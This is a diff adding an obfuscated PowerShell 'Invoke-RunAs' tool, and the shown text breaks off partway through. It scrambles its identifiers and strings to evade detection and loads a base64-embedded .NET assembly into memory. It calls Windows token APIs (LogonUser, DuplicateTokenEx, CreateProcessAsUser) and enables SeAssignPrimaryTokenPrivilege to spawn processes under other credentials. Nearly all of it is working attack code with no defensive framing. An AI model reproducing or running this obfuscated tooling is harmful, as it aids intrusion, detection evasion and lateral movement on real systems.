@@ -1,0 +1,287 @@
+ $jeyn =[TYpe]("{1}{2}{0}"-f 'Rt','s','YsTEM.CoNVe') ; $HZX2KB  =  [TYPe]("{0}{3}{1}{4}{2}"-F'SYStem.R','.','sSEmbly','efleCTion','a')  ;  Set-ITeM ("{3}{2}{0}{1}"-f 'l8c','D','RiAble:m9','VA')  ( [TYPE]("{1}{0}{2}" -F 'I','AdJPR','v') );$ZXl2gm  = [tYPE]("{0}{1}" -f'iNTp','tr');    SV ("{2}{1}{0}" -f 'w','QrMO','n') ([TYpe]("{6}{4}{7}{8}{1}{0}{5}{3}{2}" -f'RV','teRoPse','al','.mARsh','n','iceS','sysTeM.RU','tIme','.IN')  ) ;    sEt-VArIABle ('1'+'V8R7') (  [type]("{0}{1}{2}"-F'aDVap','I','32') )  ;${P`Sl`OADedR`UNAs} = ${Nu`LL}
+function inv`okE-`R`UnAs {
+
+
+    param (
+        [Parameter(maNdatOrY = ${tR`UE})]
+        [string]${u`SEr},
+        [Parameter(mANdATorY = ${tR`UE})]
+        [string]${pASsWo`Rd},
+        [Parameter(maNDAtOrY = ${F`AL`Se})]
+        [string]${d`O`MAIn}=".",
+        [Parameter(MAnDaTOrY = ${T`RUE})]
+        [string]${cO`MM`ANd},
+        [Parameter(manDatOry = ${Fal`se})]
+        [string]${A`RgS},
+        [Parameter(maNdAtORy=${f`A`LSE})]
+        [switch]${A`dD`TYpE}
+    )
+
+if (${ADdTy`PE}."i`sPRes`ent") {
+
+&("{0}{1}"-f'ech','o') ("{8}{0}{1}{2}{7}{5}{6}{4}{3}"-f '+] ','Loa','ding As','ddType',' A','mbly u','sing','se','[')
+&("{0}{1}" -f 'ech','o') ""
+
+        &("{1}{0}{2}" -f 'dd-','A','Type') -TypeDefinition @"
+    using System;
+    using System.Diagnostics;
+    using System.Runtime.InteropServices;
+    using System.Security.Principal;
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SECURITY_ATTRIBUTES
+    {
+        public Int32 Length;
+        public IntPtr lpSecurityDescriptor;
+        public bool bInheritHandle;
+    }
+        
+    public enum SECURITY_IMPERSONATION_LEVEL
+    {
+        SecurityAnonymous,
+        SecurityIdentification,
+        SecurityImpersonation,
+        SecurityDelegation
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+    
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct STARTUPINFO
+    {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public uint dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    public class AdjPriv
+    {
+        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
+        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
+  
+        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
+        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        internal struct TokPriv1Luid
+        {
+            public int Count;
+            public long Luid;
+            public int Attr;
+        }
+  
+        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
+        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
+        internal const int TOKEN_QUERY = 0x00000008;
+        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
+
+        public static bool EnablePrivilege(long processHandle, string privilege, bool disable)
+        {
+            bool retVal;
+            TokPriv1Luid tp;
+            IntPtr hproc = new IntPtr(processHandle);
+            IntPtr htok = IntPtr.Zero;
+            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
+            tp.Count = 1;
+            tp.Luid = 0;
+            if(disable)
+            {
+                tp.Attr = SE_PRIVILEGE_DISABLED;
+            }
+            else
+            {
+                tp.Attr = SE_PRIVILEGE_ENABLED;
+            }
+            retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
+            retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+            return retVal;
+        }
+    }
+
+    public static class Advapi32
+    {
+
+        [DllImport("advapi32.dll", CharSet=CharSet.Auto)]
+        public extern static bool DuplicateTokenEx(
+            IntPtr hExistingToken,
+            uint dwDesiredAccess,
+            ref SECURITY_ATTRIBUTES lpTokenAttributes,
+            int ImpersonationLevel,
+            int TokenType,
+            ref IntPtr phNewToken);
+            
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool LogonUser(
+            string pszUsername, 
+            string pszDomain, 
+            string pszPassword,
+            int dwLogonType, 
+            int dwLogonProvider, 
+            ref IntPtr phToken);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
+        public static extern bool CreateProcessAsUser(
+            IntPtr hToken, 
+            string lpApplicationName,
+            string lpCommandLine, 
+            ref SECURITY_ATTRIBUTES lpProcessAttributes, 
+            ref SECURITY_ATTRIBUTES lpThreadAttributes, 
+            bool bInheritHandle, 
+            Int32 dwCreationFlags, 
+            IntPtr lpEnvrionment,
+            string lpCurrentDirectory, 
+            ref STARTUPINFO lpStartupInfo,
+            ref PROCESS_INFORMATION lpProcessInformation);
+
+
+        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+        public static extern bool CreateProcessWithLogonW(
+            String userName,
+            String domain,
+            String password,
+            int logonFlags,
+            String applicationName,
+            String commandLine,
+            int creationFlags,
+            int environment,
+            String currentDirectory,
+            ref  STARTUPINFO startupInfo,
+            out PROCESS_INFORMATION processInformation);
+    }
+    
+    public static class Kernel32
+    {
+        [DllImport("kernel32.dll")]
+        public static extern uint GetLastError();
+    }
+"@  
+
+} else {
+    if (${ps`lOA`d`edRunAS} -ne ("{1}{0}" -f 'RUE','T')) {
+       ${SCRI`P`T:PSloa`dE`dRunaS} = ("{0}{1}" -f'T','RUE')
+        &("{0}{1}"-f'ech','o') ("{10}{4}{3}{8}{5}{11}{1}{7}{6}{0}{2}{12}{9}" -f 'ef','y usi','lecti','in',' Load','s','System.R','ng ','g A','n','[+]','sembl','o')
+        &("{1}{0}"-f 'ho','ec') ""
+       ${PS} = ("{36}{51}{124}{116}{129}{90}{162}{20}{165}{71}{111}{3}{127}{27}{141}{61}{54}{138}{164}{77}{153}{92}{172}{130}{6}{100}{150}{135}{93}{118}{167}{178}{39}{38}{32}{26}{49}{95}{168}{170}{89}{133}{10}{76}{48}{12}{18}{131}{121}{115}{132}{84}{107}{148}{155}{22}{98}{28}{67}{112}{64}{108}{16}{60}{88}{9}{44}{59}{142}{5}{123}{17}{58}{106}{144}{79}{40}{160}{31}{105}{91}{74}{137}{97}{42}{83}{114}{2}{163}{99}{8}{109}{81}{147}{128}{152}{119}{65}{7}{14}{56}{149}{146}{25}{134}{171}{157}{24}{62}{68}{63}{69}{19}{156}{78}{11}{52}{176}{34}{46}{87}{23}{55}{73}{113}{57}{174}{154}{151}{13}{21}{85}{86}{175}{47}{43}{140}{50}{169}{125}{173}{41}{122}{30}{161}{33}{139}{101}{4}{159}{166}{103}{72}{1}{117}{53}{66}{110}{80}{75}{0}{136}{120}{177}{96}{158}{94}{102}{35}{104}{70}{143}{45}{29}{37}{15}{126}{82}{145}"-f 'ANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGw','GIAMAAAABoAA','aWJ1dGUAQ29tcGlsYXRpb','CAAAGAucnNyYwAAAGgDAAAAQAAAAAQAAAAUA','AAAAAAEAAAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQB','FTABQUk9DRVNTX0lORk9S','CkBQAACAcAACNTdHJpbmdzAAAAA','vY2Vzc0l','5QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAExvb2t1cFByaXZpbGVnZVZhbHVlAGR3WFNpemUAZHdZU2l6ZQBMZW5','dWxlPgBTRV9QUklWSUxFR0VfRU5BQkxFRA','GAK0GJQAGAAsFJQBTgDQATwBTgEkATwBTgOQATwBTgJwATwA','cnkAY3VycmVudERpcmVjdG9yeQAAAAAAAACWZGjNb64yTZfnFNQeWEO1AAQ','oFZQABAAAAAACAAJMgBwRxAAcAAAAAAIAAkyByA3kAC','xcBAAAAQzpcVXNlcnNcYWRtaW5cc291cmNlXHJlcG9zXEFkalBy','uZm9ybWF0aW9uAFNlY3VyaXR5SW1wZXJzb25hdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgBscFN0YXJ0dXBJbmZvAHN0YXJ0dXBJbmZvAFplcm8AbHBEZX','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','EQD3BAEARAETAMgAAQAAARUAFQ','VRZX0FUVFJJQlVURVMAQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcAZHdYAFRPS0VOX1FVRVJZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGF','gBQIAAAAACWAF4BgQANALwgAAAAAIYYIgUGABAAAA','2AEFkalByaXYAd1Nob3dXaW5kb3cARHVwbGljYXRlV','AAAAAAAAAAAAAAAAAAAAAAAAA','aXZcQWRqUHJpdlxvYmpcUmVsZWFzZVxBZGpQcml2LnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','FkAIgUQAGEAI','BgEIAEBCgIGGAi3elxWGTTgiQQAAAAABAEAAAAEAgAAAAQDAAAABAgAAAAEIAAAAAIGCAIGAgMGEQwCBgkCBg4CBg','ZpbGVnZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwVG9rZW5BdHRyaWJ1dGVzAGxwUHJvY2Vz','5jdG9yAGxwU2VjdXJpdHlEZXNjcmlwdG9yAEludFB0cgBBdHRyAFN5c3Rlb','EQC','AAAAAAA','A2AAgAHAA7AAgAIABAAAgAfAA7AAgAgA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAADAMAA','YW5','AkB','AAAA','B','AAAAAAAAAAAAAAA','TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','ogQGAPYB5AMGAOsD5AMGAHEG5AMGAD0F5AMAAAAAKwAAAAAAAQABAAkBEAC0AAAAPQABAAEAAQEAAF8AAABBAAQAAQAJARAAfAAAAD0ACQABA','QGADgCXAUGABYCXAUGAI4C','2tQcml2MUx1aWQAcGx1aWQAcHN6UGFzc3dvcmQAcGFzc3dvcm','AAAAAAAAAAA','XR0cm','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIMAAAAAAAAAAAAABiMAAAACAAAAAAAAAAAAAAAAAAAAAAAAAA','BTRV9QU','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AQIFBwIR','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','D4BYgAGAEQFTwAAAAAAgACTIK','QAAAAPQANAAEAAQAQAL0GAABFAB8AAQCBARAAAQAAAEUAIwAGAIEBEA','FpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAgAAA','gAQEIAyAAAQUgAQEREQQgAQEO','GkAZwBoAHQAIACpACAAIAAyADAAMQA4AAAAKgABAAEATAB','AAAAAAAAAAAAAAAAAAAAAA','YCBgoLAAYCGAIQESQIG','NrdG9wAGR3TG9nb25Qc','ByaXYAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMTgAACkBACRkMmYwMzc0OS','j','klWSUxFR0VfRElTQUJMRUQAU0VDVVJJVF','UCAASAAAABAAAAAAAAAAAAAAAAAL0GAAACAAAAAAAAAAAAAAAoAP8AAAAAAAkABgAAAABB','xCAAACQOAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','c0F0dHJpYnV0ZXMAbG9nb25GbGFncwBkd0NyZWF0aW9uR','XRpb25GbGFncwBkd0ZsYWdzAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBkd0Rlc2lyZWRBY2Nlc3MAaFByb2Nlc3MAU2VjdXJpdHlBbm9ueW1vdXMAT2JqZWN0AGxwRW52cmlvbm1lbnQAZW52aXJvbm1lbnQAQ291bnQAaG9zdABuZXdzdABoU3','wD/AC4ASwASAS4AUwAMAS4AWwAMAS4AYwAqAS4AawBUAQEAAAAAAAkAGgC+A8sDQQEDAKoFAQBBAQUABwQBAEABBwByAwEABgENANEGAQBAAQ8A7QQBAEI','JlbGVuAHBzekRvbWFpbgBkb21haW4AU2VjdXJpdHlJZGVudGlmaWNhdGlvbgBTZWN1cml0eURlbGVnYXRpb24AbHBQcm9jZXNzSW5mb3JtYXRpb24AcHJ','lAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABAAAwAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGE','AxAAgAhABFAAgAiABKAC4ACwDOAC4AEwDXAC4AGwD2AC4AI','mxhZ3MAY3JlY','RkSW5wdXQAaFN0ZE91dHB1dABwcmV','AAA','ACAAA','gCAAABADAAMAAwADAAMAA0A','BgHAAMCGAgQGAcAAwIODhAKBgADAgoOAgwABgIYCRARCAgIEBgKAAYCDg4OCAgQGBYACwIYDg4QEQgQEQgCCBgOEBEUEBEQEgALAg4ODggODggIDhARFBAREAMAAAkIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAADAE','b21tYW','AHIAaQB2AAA','GAJIGTwAGA','ABd9IwAABB','EaXJlY3Rv','2Vzc0lkAGhUaHJlYWQAbHBSZXNlcnZlZABUb','QAagBQ','AcGh0b2sASW1wZXJzb25hdGlvbkxldmVsAGRpc2FsbABhZHZhcGkzMi5kbGwAa2VybmV','AAAAAAAAAAAAAAAA','lidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRya','wDcAQAABADlBQAABQDABQAABgCOAQAABwAEBgAACA','A','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','J','ZHZhcGkzMgBLZXJuZWwzMgBjYlJlc2VydmVkMgBscFJlc2VydmVkMgA8TW9k','VQBWgFEEVQAGAFYGJQAGACMBJQAGABcBWQAGAAwBWQAGAPwAWQAGACsBXAAGANMEXAAGAJ0BXAAGAOA','AAAAAABAAAAAA','bk5hbWUAdXNlck5hbWUAcHN6VXNlcm5hbWUAbHBDb21tYW5kTGluZQBj','KwgSABh9JQAABBQDEgB8JAAABCgDAAAGJgcWEgAWfg8AAAp+DwAACigBAAAGKh4CK','BIAAAAJAAAAJQAAAAoAAAAxAAAAEAAAAAgAAAANAAAAAQAAAAEAAAACAAAACAAAAAEAAAABAAAAAQAAAAAA2AMBAAAAAAAGAOcCewUGAFQD','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AKAAAARQAjAAoADQ','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAwAAAB0MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','HRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAZHdGaWxsQ','gUVAGkAIgUQAHEAIgUQAJEAIgUgAJEAzgQlAIkAIgUGAAgAFAAxAAgAGA','HRyaWJ1dGUAQXNzZW1ibHlDb21wYW5','KwMAAAEAAAAI1VTA','VgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAA','wBsAGEAdABpAG8AbgAAAAAAAACwBGwCAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAE','AAAA','kbGUAYkluaGVyaXRIYW5kbGUAbHBUaXRsZQBscEFwcGxpY2F0aW9uTmFtZQBhcHBsaWNhdGlv','YwBkd1RocmVhZE','B4BgAACQDiBgAACgC0BAAACwBkBAAAAQDHAQAAAgAzBAAAAwBVAQAABAD5BQAABQC3AQAABgDqAQAABwAUBgAACACGBgAACQD1BgAACgDCBAIACwB5BAkAIgUBABEAIgUGABkAIgUKA','D','ndGg','AbQBlAAAAQQBkAGoAUAByAGkAdgAuAGQAbABsAAAAMAAIAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABBAG','AAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAeBAAAAAgAAAAEgAAAAIAAAAAAAAAAAAAAAAAA','wD/AC4AKwAMAS4AMwAMAS4AOwAMAS4AQ','AB0Fkal','WJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRy','AAQCcAwAAAgAIAQAAAwCeAwAAAQCYBgAAAgDXAQAAAwBDAQAAAQCAAQAAAgBuAQAAAwB4AQAAAQDwAwAAAgBGBgAAAwDTBQAABACkAwAABQAAAgAABgAYBAAAAQDQAQAAAgApBAAAAwBJAQAABAAKAgAABQDdBAAABgD/AwAA','AAAAAABQRQAATAEDAF/FYFoAAAAAAAAAAOAAIiALATAAABIAAAAGAAAAAAAAcjAAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAA','QABAEMAbwBtAG0AZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAAA4AAgAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAQQBkAGoAUAByAGkAdgAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMQAuADAALgAwAC4AMAAAADgADAABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAQQBkAGoAUAByAGkAdgAuAGQAbABsAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByA','e','1Rva2VuAH','AALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','cAJwAAAAAAgACWIBUFygAyAAAAAQCfAwAAAgC3AwAAAwCdBgAABAAlBAAABQC4BgAABgAjBAA','AAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAA','TUFUSU9OAFNUQVJUVVBJTkZPAFRPS0VOX0FESlVTVF9QUklWSUxFR0VTAFNFQ1VSS','AA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAA','AAAAAAAAAAA','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','AAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAGAAAAAAAAAAAAAAAAAAAQAAAQg','dGluZ1Rva2VuAHBoVG9rZW4AT3Bl','AEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAA','AAAAAADAAAAHYyLjAuNTA3MjcAAAAABQBsAAAAOAUAACN+AA','AAAIAAliDRBogAEAAAAAAAgACWIO0ElQAWAAAAAACAAJYg9wSgABwAAAAAAIAAliDIAL','AQAABAAAAgClAQAAA','AWQAGAPAAWQAGAIcDWQAGAI8DWQAGACoGWQAGADgGWQAGAH4CWQAGACIGWQAGAMUGXwAGABMAXwAGAB8AJQAGAKMGJQA','S5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ','UQAAADADAAAZAEAACNCbG9iAAAAAAAAAAIAAAFXnQIUCQIAAAD6ATMAFgAAAQAAA','AeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuAD','5kTGluZQBWYWx1ZVR5cGUAVG9rZW5UeXBlAGR3TG9nb25UeXBlAEd1aWRBd','AAAAAAABMwBgBgAA','AAAAAADAM0AAAA','AAAAVDAAAAAAAAAAAAAAAABfQ29yRGxsTW','AAAAAAAAAAAAABUMAAAAAAAAEgAAAACAAUA','lfSU1QRVJTT05BVElPTl9MRVZ','AAAAA','lkAGR3UHJvY','AAAAAAAAAAAAAAAAAAAAAAAAAAA=','C','sMzIuZGxsAEFkalByaXYuZGxsAFN5c3RlbQBFbnVtAGhFeGlz','CkA','m92aWRlcgBMb2dvblVzZXIAQ3JlYXRlUHJvY2Vzc0FzVXNlcgBoU3RkRXJyb3IAR2V0TGFzdEVycm9yA','LAMAAAQAAAAI0dVS','AAAX8VgWgAAAAACAAAAHAEAAAQvAAAEEQAAUlNEU50IyNt/egRPrTqvLNKC4','blByb2Nlc3NUb2tlbgBwaE5ld','IAFmp9JAAABAQsChIAFn0lAAAE','C0zOTcxZmRkMGVjNzMAAAwBAAcxLjAuMC4wAAAAAAAAA','IgUQADEAIgUQADkAIgUQAEEAIgUQAEkAIgUQAFEAIgUQA','G9rZW5FeABscEN1cnJlbnR','pbmdNb2RlcwBBZGp1c3RUb2tlblByaX','AAAAAAAAAAAAAAAAA','WAGEAcgBGAGkAbABl','QARW5hYmxlUHJpdmlsZWdlAHByaXZpbGVnZQBkaXNhYmxlAHByb2Nlc3NI','A','AAAAAAAAACAwAABPAAAAAEAAAGgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAADoLgAAHAAAAAAAAAAAAAAAAAAAAAAA','25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBd','AAAQAAEQJzDgAACn4PAAAKCx8oEgEoAgAABiYS','AAAAAAAAAAAIAA','AEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4Ac','wUGACQCSQUPAJsFAAAGAEwCogQGAMoCogQGAKsCogQGADsDogQGAAc','EQADYBAAA9ACMACwAGAJcDTwAGACgFJQAGAI4BUgAGBvQATwBWgF8GVQBW','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','gDoEVQBWgIwE','2aWNlcwBEZWJ1Z2d','BAAAAoqQlNKQgEAAQ','AAAAAAAAAAA','0wODNiLTQ1NDctODM1M','AAAAAAAAAAAAA','BCA','AAAA','DogQGACADogQGAGMCog')    
+       ${DLLBy`T`Es}  =   $JEyN::("{0}{2}{5}{4}{3}{1}"-f 'From','ing','Base6','r','t','4S').Invoke(${p`s})
+       ${asSE`mb`LY} =  (  VAriaBlE ('hZx2'+'Kb')  -VaLuEoN  )::("{1}{0}"-f'oad','L').Invoke(${dl`lbYt`ES})
+    }
+}
+    if ((${eNV:uS`Er`NamE} -eq "$($env:computername)$")) {
+        &("{1}{0}" -f 'ho','ec') ("`n[>] "+'User'+' '+'i'+'s '+"`"NT "+"Authority\SYSTEM`" "+'so'+' '+'ru'+'nni'+'ng '+'Lo'+'g'+'onUse'+'r '+'-'+'> '+'Duplicate'+'Tok'+'enE'+'x '+'->'+' '+'Cre'+'at'+'e'+'Pro'+'cessA'+'sUser')
+        
+        ${PR`oces`sHaND`LE} = (&("{2}{0}{1}"-f'-Proces','s','Get') -id ${p`iD})."HAN`D`Le"
+          $M9L8cd::("{1}{0}{2}{3}"-f 'i','EnablePr','vile','ge').Invoke(${pr`OCeSs`Ha`NdLE}, ("{4}{6}{0}{2}{7}{5}{3}{1}"-f'Pr','e','imaryTo','rivileg','SeAs','enP','sign','k'), ${DiSab`LE}) 
+    
+        ${LO`G`ontOKenHAn`Dle} =  (CHilDitem ("{0}{3}{2}{1}"-f'varIaBl','M','L2G','e:Zx')  )."V`Alue"::"z`ERo"
+
+        &("{1}{0}"-f 'o','ech') ("`n[>] "+'Ca'+'llin'+'g '+'Advapi3'+'2::'+'LogonU'+'ser')
+        ${c`ALlReSu`LT1} =   ( gEt-vARiaBLE ("{0}{1}" -f '1V8','r7')  )."VA`LUE"::"LO`Go`NUS`er"(${Us`ER}, ${do`Ma`iN}, ${PA`sSW`Ord}, 2, 0, [ref] ${logOnT`oken`HA`NDLE})
+
+        if (!${ca`ll`ReSulT1}) {
+            &("{1}{0}"-f 'o','ech') ("`n[!] "+'Mmm,'+' '+'som'+'e'+'thing '+'w'+'ent '+'wron'+'g'+'! '+'GetLas'+'t'+'E'+'rro'+'r '+'r'+'eturne'+'d:')
+            &("{1}{0}" -f 'ho','ec') "==> $((New-Object System.ComponentModel.Win32Exception([int][Kernel32]::GetLastError())).Message)`n "
+        } else {
+            &("{0}{1}" -f'ec','ho') ("`n[+] "+'Su'+'c'+'cess, '+'Logo'+'nToken'+'Ha'+'n'+'dle:'+' '+'')
+            &("{0}{1}" -f 'ec','ho') ${l`oGonTO`Ken`HanD`Le}
+        }
+
+        ${seci`MPE`RsONa`TI`oN} = &("{1}{0}{2}"-f 'jec','New-Ob','t') ("{4}{2}{7}{6}{8}{1}{0}{5}{3}"-f '_','ION','TY_IMPERS','EL','SECURI','LEV','A','ON','T')
+        ${SecURit`Y`_ATtr`ibutES} = &("{0}{1}{2}" -f 'New','-','Object') ("{4}{2}{1}{0}{3}" -f 'T','Y_A','ECURIT','TRIBUTES','S')
+        ${Pri`V`l`Og`onT`oKEnhanDlE} =  (  itEm  ("{1}{2}{4}{0}{3}" -f'E:zx','v','a','L2gm','riABL'))."VA`luE"::"ZE`Ro"
+
+        &("{1}{0}"-f 'ho','ec') ("`n[>] "+'Calli'+'ng '+'A'+'dvapi32'+'::Du'+'plic'+'a'+'t'+'e'+'Toke'+'nEx')
+        ${C`ALLrESUl`T2} =   (  VARiaBLe  ("{1}{0}"-f'8R7','1V') )."VAL`Ue"::"D`UP`liCa`Tet`OKENEx"(${lOGO`NTo`kENH`ANDLE}, 0x2000000, [ref] ${sec`Urity_at`TR`iBuT`eS}, 2, 1, [ref] ${P`R`i`VlOg`oNToKEnHa`Ndle})
+
+
+        if (!${cALlr`e`SUlT2}) {
+            &("{1}{0}" -f'o','ech') ("`n[!] "+'M'+'mm, '+'someth'+'in'+'g '+'wen'+'t '+'wro'+'ng!'+' '+'GetLastErr'+'o'+'r '+'re'+'t'+'urned:')
+            &("{0}{1}"-f 'ec','ho') "==> $((New-Object System.ComponentModel.Win32Exception([int][Kernel32]::GetLastError())).Message)`n "
+        } else {
+            &("{0}{1}"-f 'e','cho') ("`n[+] "+'Succ'+'ess, '+'Priv'+'Lo'+'g'+'o'+'nT'+'okenHa'+'ndle:')
+            &("{1}{0}"-f'cho','e') ${P`RivloGO`Nt`O`KenhAnDLE}
+        }
+
+        
+        ${s`TA`RtuPi`NFO} = &("{2}{1}{0}" -f'bject','w-O','Ne') ("{0}{2}{1}" -f 'STARTU','NFO','PI')
